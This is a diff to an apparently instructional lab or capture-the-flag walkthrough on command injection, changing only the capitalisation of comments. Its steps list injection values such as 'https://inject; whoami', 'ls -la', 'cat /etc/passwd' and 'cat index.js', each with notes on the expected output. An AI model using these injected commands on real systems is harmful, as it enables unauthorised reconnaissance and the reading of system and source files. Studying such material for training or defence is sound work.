@@ -25,11 +25,11 @@ e.g. `https://inject; pwd`
 3. Repeat this tasks with the following bash code add for more information  
 **Document everything for later**    
 `https://inject; whoami`
-   *current user should be sbx-user0666 or similar*   
+   *Current user should be sbx-user0666 or similar*   
 `https://inject; ls -la`
-    *lists the current directory (index.js + node_modules subdirectory)*   
+    *Lists the current directory (index.js + node_modules subdirectory)*   
 `https://inject; cat /etc/passwd`
-  *lists current users*  
+  *Lists current users*  
 `https://inject; cat index.js`
     *Provides code for basic information on how this page functions*   
     Important information to be gathered from this file includes
